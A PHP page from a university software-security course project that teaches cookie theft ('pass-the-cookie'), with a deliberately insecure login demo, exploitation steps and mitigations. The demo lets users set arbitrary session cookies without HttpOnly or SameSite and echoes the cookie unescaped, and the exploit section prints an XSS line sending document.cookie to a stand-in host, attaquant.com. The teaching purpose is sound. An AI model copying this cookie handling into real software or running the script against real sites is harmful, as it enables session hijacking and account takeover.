<?php

/*****************************************************
 * cookies.php                                       *
 *                                                   *
 * Project : Session project                         *
 * Course : GLO-7009 - Software security             *
 * Team : Team 2                                     *
 * Session : Winter 2024                             *
 * University : Laval University                     *
 * Version : 1.0                                     *
 *****************************************************/

/*****************************************************
 *                       MODEL                       *
 *****************************************************/
require("model.php");

/*****************************************************
 *               COOKIES AUTHENTICATION              *
 *****************************************************/
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST["modifyCookie"]) && isset($_POST["cookieField"])) {
        if (!isset($_COOKIE["userToken"])) {
            setcookie("userToken", $_POST["cookieField"], time() + 
                        (60 * 60 * 24));
            header("Location:" . $config["site_link"] . "/" . 
                    $menu[2]["folder"] . "/" . $menu[2]["files"][0]["name"] . 
                    "?view=demonstration");
            exit();
        } else {
            unset($_COOKIE["userToken"]);
            setcookie("userToken", $_POST["cookieField"], time() + 
                        (60 * 60 * 24));
            header("Location:" . $config["site_link"] . "/" . 
                    $menu[2]["folder"] . "/" . $menu[2]["files"][0]["name"] . 
                    "?view=demonstration");
            exit();
        }
    } else if (isset($_POST["connect"])) {
        $error = array();
        if (isset($_POST["email"])) {
            if (!filter_var($_POST["email"], FILTER_VALIDATE_EMAIL)) {
               $error["email"] = "Veuillez entrer une adresse courriel valide.";
            }
        } else {
            $error["email"] = "Veuillez entrer une adresse courriel.";
        }

        if (!isset($_POST["password"]) || (isset($_POST["password"]) && 
                    empty($_POST["password"]))) {
            $error["password"] = "Veuillez entrer un mot de passe.";
        }

        if (!isset($error["email"]) && !isset($error["password"])) {
            $token = login($_POST["email"], $_POST["password"]);
            if (isset($token)) {
                if (isset($_POST["persistent"])) {
                    setcookie("userToken", $token, time() + 
                                (60 * 60 * 24 * 30));
                } else {
                    setcookie("userToken", $token, time() + (60 * 60 * 24));
                }
                header("Location:" . $config["site_link"] . "/" . 
                        $menu[2]["folder"] . "/" . 
                        $menu[2]["files"][0]["name"] . "?view=demonstration");
                exit();
            } else {
                $error["token"] = 
                    "Nom d'utilisateur ou mot de passe incorrect.";
            }
        }
    } else if (isset($_POST["disconnect"])) {
        logout($_COOKIE["userToken"]);
        unset($_POST);
        unset($_COOKIE);
    }
}

/*****************************************************
 *                      CONTENT                      *
 *****************************************************/
$presentation = '<div class="table">
    <div class="row split">
        <section>
            <h2>Catégorie</h2>
            <p>Authentification par cookies</p>
        </section>
        <section>
            <h2>Impact potentiel</h2>
            <p>Confidentialité et intégrité</p>
        </section>
    </div>
    <section class="row">
        <h2>Description</h2>
        <p>On utilise des jetons (tokens) pour éviter d\'enregistrer les 
            identifiants en clair sur le navigateur de l\'utilisateur. 
            On doit enregistrer le jeton de connexion sur l\'ordinateur local 
            pour maintenir la connexion. On peut effectuer cet enregistrement à 
            l\'aide d\'un témoin (cookie) qui sera conservé localement sur 
            le navigateur. 
        </p>
        <p>La subtilisation des témoins est une vulnérabilité permettant à 
            l\'usurpateur de récupérer les témoins pour contourner 
            l\'authentification habituelle. Autrement dit, l\'usurpateur 
            récupère les témoins, et se fait passer pour la victime dans le but 
            d\'accéder à des informations sensibles. Cette attaque est aussi 
            nommée Pass-the-cookie ou Pass the hash. Nous avons réussi à 
            exploiter cette attaque sur un compte Google par simple copie des 
            témoins. Cela démontre que même les géants du web ne sont pas à 
            l\'abri de cette attaque.
        </p>
    </section>
    <section class="row">
        <h2>Objectifs</h2>
         <ul class="list">
            <li>Contourner les mesures d\'authentification.</li>
            <li>Accéder à des informations sur des utilisateurs légitimes.</li>
            <li>Effectuer des actes répréhensibles sur les utilisateurs.</li>
        </ul>
    </section>
    <section class="row">
        <h2>Causes</h2>
        <ul class="list">
            <li>La provenance du jeton n\'est pas vérifiée.</li>
            <li>La création du témoin n\'est pas suffisamment sécurisée.</li>
        </ul>
    </section>
    <section class="row">
        <h2>Exemples marquants</h2>
        <ul class="list">
            <li><strong><a href=
                "https://nvd.nist.gov/vuln/detail/CVE-2021-44151#match-9099598">
                    Reprise Software (CVE-2021-44151)</a>
                </strong><br />
                Une attaque par vol de témoins de session est survenue sur 
                l\'hébergeur de licence Reprise Software. 
                Cette entreprise n\'utilisait que des témoins qui n\’avaient 
                qu\'une courte longueur (4 caractères hexadécimaux pour Windows 
                ou 8 pour le système Linux).    
            </li>
            <li><strong><a href="https://www.cve.news/cve-2023-5723/"> 
                Firefox Vulnerability - Unrestricted Cookies Hijack via Insecure
                    `document.cookie` Usage (CVE-2023-5723))</a>
                </strong><br />
                Une attaque par vol de cookies est possible sur les versions 119
                 et antérieures de Firefox. L\'appel à la fonction JavaScript 
                 `document.cookie` peut permettre à l\'attaquant d\'avoir 
                 temporairement accès aux témoins stockés dans le navigateur en 
                 exécutant un script provenant d\'un site.
            </li>
        </ul>
    </section>
</div>';

$demonstration = '<div class="split">
    <form method="POST">
        <div>
            <h2>Scénario</h2>
            ' . ((isset($_COOKIE["userToken"]) && 
                is_logged_in($_COOKIE["userToken"])) ? '
            <p style="color: green;">L\'usager est connecté.</p>' : '
            <div class="form-group">
                ' . ((isset($error["token"])) ? '<div class="alert">' . 
                    $error["token"] . '</div>' : '') . '
            </div>
            <div class="form-group">
                <label for="email">Adresse email :</label>
                ' . ((isset($error["email"])) ? '<div class="alert">' . 
                    $error["email"] . '</div>' : '') . '
                <input id="email" class="form-control' . 
                    ((isset($error["email"])) ? ' invalid' : '') . 
                    '" name="email" type="email"' . ((isset($error["email"])) ? 
                        ' value="' . $_POST["email"] . '"' : '') . ' />
            </div>
            <div class="form-group">
                <label for="password">Mot de passe :</label>
                ' . ((isset($error["password"])) ? '<div class="alert">' . 
                    $error["password"] . '</div>' : '') . '
                <input id="password" class="form-control' . 
                    ((isset($error["password"])) ? ' invalid' : '') . 
                        '" name="password" type="password" />
            </div>
            <div class="form-group">
                <input id="persistent" class="form-check" name="persistent" 
                    type="checkbox" />
                <label for="persistent">Se souvenir de moi</label>
            </div>
            ') . '
        </div>
        <footer>
            ' . ((isset($_COOKIE["userToken"]) && 
                is_logged_in($_COOKIE["userToken"])) ? '
            <button name="disconnect" type="submit" value="disconnect">
                Déconnexion</button>
            ' : '
            <button name="connect" type="submit" value="connect">
                Connexion</button>
            ') . '
        </footer>
    </form>
    <form method="POST">
        <div>
            <h2>Configuration</h2>
            <div class="form-group">
                <label for="cookieField">Valeur du témoin (cookie)</label>
                <input id="cookieField" class="form-control" name="cookieField" 
                    type="text" value="' . $_COOKIE["userToken"] . '"/>
            </div>
        </div>
        <footer>
            <button name="modifyCookie" type="submit" value="modifyCookie">
                Modifier le témoin</button>
        </footer>
    </form>
</div>';

$exploit = '<div>
    <section>
        <h2>Conditions préalables pour l\'exploitation</h2>
        <ul class="list">
            <li>Les témoins ne sont pas vérifiés suffisamment.</li>
        </ul>
    </section>
    <section>
        <h2>Méthodes d\'exploitation</h2>
        <ul class="list">
            <li>Exporter et importer les témoins.</li>
            <li>Générer aléatoirement des témoins par force brute.</li>
            <li>Injecter du code XSS dans le navigateur de la victime.</li>
        </ul>
    </section>
    <section>
        <h2>Exécution de l\'attaque</h2>
        <ul class="list">
            <li>Subtiliser les témoins.</li>
            <li>Importer les témoins dans un navigateur.</li>
            <li>Modifier les propriétés du navigateur pour correspondre à ceux 
                de la victime. (Si besoin)</li>
        </ul>
    </section>
    <section>
        <h2>Analyse d\'un scénario vulnérable</h2>
        <p>Pour expliquer cette attaque, nous allons parcourir, étape par étape,
            l\'authentification dans une application qui ne vérifie que le 
            témoin de l\'utilisateur connecté.
        </p>
        <p>Lorsque l\'utilisateur se connecte avec ses identifiants, une requête
         de demande de connexion est envoyée au serveur. Ce dernier vérifie 
         ensuite les identifiants avec les informations existantes et génère un 
         jeton lorsque ces dernières sont valides.
        </p>
        <p>
        Prenons les identifiants suivants :
         </p>
        <table>
            <tbody>
                <tr>
                    <td style="border: 1px solid black; padding: 0px 0.5rem;">
                        <strong>Adresse courriel</strong>
                    </td>
                    <td style="border: 1px solid black; padding: 0px 0.5rem;">
                        melissaingram@test.ulaval.ca
                    </td>
                </tr>
                <tr>
                    <td style="border: 1px solid black; padding: 0px 0.5rem;">
                        <strong>Mot de passe</strong>
                    </td>
                    <td style="border: 1px solid black; padding: 0px 0.5rem;">
                        ahfoo5Iuj
                    </td>
                </tr>
            </tbody>
        </table>
        <p>Ces identifiants pourraient générer le jeton suivant : </p>
        <table>
            <tbody>
                <tr>
                    <td style="border: 1px solid black; padding: 0px 0.5rem;">
                        SguoZrBeijjAH6EhAUO4LxQFjZ1bucVdFEIManrTgtAwJiwZ2j
                    </td>
                </tr>
            </tbody>
        </table>
        <p>Dans le cas où un attaquant subtiliserait le jeton en utilisant 
            l\'une des méthodes d\'exploitation évoqués précédemment, cela 
            pourrait mener au contournement de l\'authentification. Une fois que
             l\'attaquant a réussi à copier et à importer le témoin sur son 
             navigateur, il pourra se faire passer pour la victime.
        </p>
        <p>Cette récupération pourrait être réalisé par injection XSS, 
            dont voici un exemple :</p>
        <pre class="line-numbers"><code class="language-js">
            &lt;script&gt;
                document.location=
                http://attaquant.com/vol_cookies.php?cookie=`document.cookie`;
            &lt;/script&gt;
           </code></pre>
        <p>Ce code transmet la totalité des témoins stockés dans le navigateur à
         la page vol_cookies.php de l\'attaquant en utilisant une requête GET 
         dont la clé est dénommé cookie.
        </p>
    </section>
</div>';

$fix = '<div>
    <section>
    <p>Il n\'existe pas de mesure toute faite pour corriger cette vulnérabilité,
     cependant nous pouvons tout de même atténuer les risques. 
     Voici quelques pistes de correction </p>
        <ul class="list">
            <li><strong>Mettre en place une politique de sécurité de contenu 
                (CSP)</strong><br />
                La mise en place d\'une politique CSP permet de limiter 
                l\'attaque par vol des témoins de connexion. 
                Tel que décrit dans la section de la correction d\'une injection
                 XSS. 
            </li>
            <li><strong>Vérifier l\'agent utilisateur du navigateur</strong>
                <br />
                L\'agent utilisateur est une chaîne de caractères qui permet 
                    d\'identifier le navigateur. 
                Un exemple de cet agent pourrait être :
                    <pre class="line-numbers"><code class="language-html">
    Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0
                    </code></pre>
                <p>Cette chaîne peut être décrite de la façon suivante : </p>
                <ul>
                    <li>Mozilla/5.0 : <br />
                    Cette partie de la chaîne permet d\'indiquer que le 
                    navigateur est compatible avec Mozilla. Elle est restée 
                    présente pour des raisons historiques et tous les 
                    navigateurs l\'implémente aujourd\'hui.
                    </li>
                    <li>(X11; Ubuntu; Linux x86_64; rv :35.0) : <br />
                    Cette chaîne contient la plateforme, le système 
                    d\'exploitation et la version ou révision du navigateur.
                    </li>
                    <li>Gecko/20100101  : <br />Cet partie présente la version 
                    et le moteur de rendu du navigateur.
                    </li>
                    <li>Firefox/35.0 : <br />Pour terminer, cette dernière 
                    sous-chaîne présente le nom du navigateur et sa version 
                    publique.
                    </li>
                </ul>
            </li>
            <li><strong>Rotation et expiration des témoins</strong><br />
            Afin de réduire les risques d\'usurpation d\'identité de la victime,
             on peut effectuer une rotation du témoin à chaque requête. 
             Autrement dit, lorsque l\'utilisateur effectue une requête auprès 
             du serveur, il vérifie l\'authenticité du témoin avec la valeur 
             qu\'il détient dans sa base de données. Si la valeur est exacte, le
              serveur l\'invalide et crée un nouveau témoin.   
            </li>
            <li><strong>Liaison du jeton avec d\'autres informations</strong>
            <br />
                Cette méthode consiste à ajouter d\'autres informations lors de 
                la génération du jeton. On pourrait par exemple, lier le jeton 
                avec l\'identificateur de l\'utilisateur, ce qui complexifierait
                 une attaque par force brute. On peut aussi lier le jeton avec 
                 son adresse IP, cela permet d\'identifier l\'utilisateur. 
                 Lorsque l\'utilisateur quitte son réseau ou un attaquant d\'un 
                 autre réseau arrive à récupérer le témoin, il y aura 
                 déconnexion.  
            </li>
            <li><strong>Mettre en œuvre des attributs sécurisés</strong><br />
                Des attributs peuvent être ajouté aux témoins dans le but 
                d\'empêcher l\'exploitation par une personne extérieure. Parmi 
                les plus importants, on retrouve : 
                <ul>
                    <li>L\'attribut HttpOnly: <br />
                        Il permet de limiter l\'exploitation d\'injections XSS 
                        en bloquant la récupération des témoins qui seraient 
                        récupérés grâce à la méthode ‘document.cookie’. Cette 
                        limitation est rendue possible lorsqu\'il a une valeur 
                        établie à true.
                    </li>
                    <li>L\'attribut SameSite: <br />
                        Le témoin n\'est accessible que depuis le site défini 
                        par l\'attribut Domain. Les valeurs possibles sont :
                            <ul>
                                <li>strict :<br /> 
                                    Elle est la plus sécurisée et prévient de 
                                    l\'exploitation par des scripts 
                                    d\'injections XSS.
                                </li>
                                <li>lax : <br />
                                    Elle bloque l\'envoi du témoin, si ce 
                                    dernier ne provient pas du site d\'origine. 
                                    C\'est un compromis entre la sécurité et 
                                    l\'usage.
                                </li>
                                <li>none : <br />
                                    Elle n\'offre aucune sécurité et peut être 
                                    utilisée pour envoyer de l\'information à 
                                    tous les sites.
                                </li>
                            </ul>
                    </li>
                </ul>
            </li>
        </ul>
    </section>
    <section>
        <h2>Documentation et ressources</h2>
        <ul class="list">
            <li><a href="https://elsefix.com/fr/what-is-a-pass-the-cookie-attack-how-to-stay-logged-in-to-websites-safely.html" target="_blank">Elsefix [Qu\'est-ce qu\'une attaque Pass-the-Cookies]</a></li>
            <li><a href="https://www.crowdstrike.com/cybersecurity-101/pass-the-hash/" target="_blank">Crowdstrike [What is a pass-the-hash attack]</a></li>
        </ul>
    </section>
</div>';

/*****************************************************
 *                    RENDER PAGE                    *
 *****************************************************/
echo render_malicious("Authentification par cookies", $presentation, $demonstration, $exploit, $fix);
